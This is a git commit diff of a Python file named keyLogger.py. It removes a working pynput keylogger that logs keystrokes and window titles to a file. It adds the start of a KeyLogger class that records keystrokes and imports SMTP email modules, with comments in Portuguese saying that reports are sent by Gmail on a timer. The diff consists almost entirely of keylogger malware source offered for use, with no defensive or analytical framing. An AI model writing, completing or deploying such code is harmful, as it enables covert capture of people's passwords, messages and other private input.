69f84f4ede0b32802eacfe568f1916b6849ebd57
Darlan <darlaneduardoguimaraes@gmail.com>
2023-07-13 10:06:20 -0300

    class KeyLogger

--- keyLogger.py
+++ keyLogger.py
@@ -1,41 +1,40 @@
-from pynput.keyboard import Key, Listener
-import win32gui
+import keyboard
+import smtplib #Envio de email usando protocolo SMTP (gmail)
+from threading import Timer # Intervalo de tempo
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-numbers = [str(i) for i in range(10)]
-small_letters = [chr(i) for i in range(ord('a'), ord('z') + 1)]
-capital_letters = [chr(i) for i in range(ord('A'), ord('Z') + 1)]
-caracter = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', '\\', '|', ';', ':', "'", '"', ',', '.', '/', '?']
-complete_alphabet = numbers + small_letters + capital_letters + caracter
-alphabet = []
+class KeyLogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
 
-for letter in complete_alphabet:
-    letter = letter.replace("'", "")
-    alphabet.append(letter)
+        # Log das teclas digitadas
+        self.log = ""
 
-def on_press(key):
-    hwnd = win32gui.GetForegroundWindow()
-    win_title = win32gui.GetWindowText(hwnd)
+        # Define o tempo de inicio e fim da execução
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
 
-    key = str(key).replace("'", "")
-    print(key)
-    if key in alphabet:
-        with open('log.txt', 'a') as f:
-            f.write(key)
-    elif key == "Key.backspace":
-        with open('log.txt', 'r+') as f:
-            f.seek(0, 2)
-            f.seek(f.tell() - 1, 0)
-            f.truncate()
-    elif key == "Key.space":
-        with open('log.txt', 'a') as f:
-            f.write(" ")
-    elif key == "Key.caps_lock":
-        pass
-    else:
-        with open('log.txt', 'a') as f:
-            f.write("\n" + key + "     " + win_title + "\n\n")
+        def callback(self, event):
+            # Esse evento sempre sera chamada quando uma tecla for digitada
 
+            name = event.name
 
-if __name__ == '__main__':
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+            if len(name) > 1:
+                # Não é um caracter ou chave especial
+                if name == "space":
+                    name = " "
+                elif name == "enter":
+                    # adicionar uma nova linha sempre que um ENTER for pressionado
+                    name = "[ENTER]\n"
+                elif name == "decimal":
+                    name = "."
+                else:
+                    # substitua os espaços por sublinhados
+                    name = name.replace(" ", "_")
+                    name = f"[{name.upper()}]"
+                    # adiciona o nome da chave a variável global `self.log`
+                self.log += name
+
